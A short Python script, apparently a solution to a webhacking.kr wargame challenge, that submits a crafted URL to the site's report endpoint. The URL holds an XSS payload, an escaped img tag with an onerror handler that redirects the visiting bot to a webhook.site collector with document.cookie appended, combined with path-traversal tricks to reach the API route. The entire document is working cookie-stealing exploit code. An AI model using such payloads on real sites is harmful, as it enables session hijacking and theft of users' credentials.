import requests

url = "http://webhacking.kr:10011/report.php"

def solve():
    webhook_url = "https://webhook.site/f49d7a53-82ff-4284-b5b2-8a3e1f1c2b25"
    payload = {"url":"/api.php/search/%7b\"results\":[%7b\"name\":\"%5cu003cimg src=a onerror=location.href=\'{}%3fa=\'+document.cookie>\",\"terrain\":\"a\",\"population\":\"a\",\"diameter\":\"1\"%7d]%7d<a/..%2f..%2f..%2f..%2f..%2f".format(webhook_url)}
    res = requests.post(url, data=payload)
    if "reported! thank you!" in res.text:
        print("reported! thank you!")

if __name__ == "__main__":
    solve()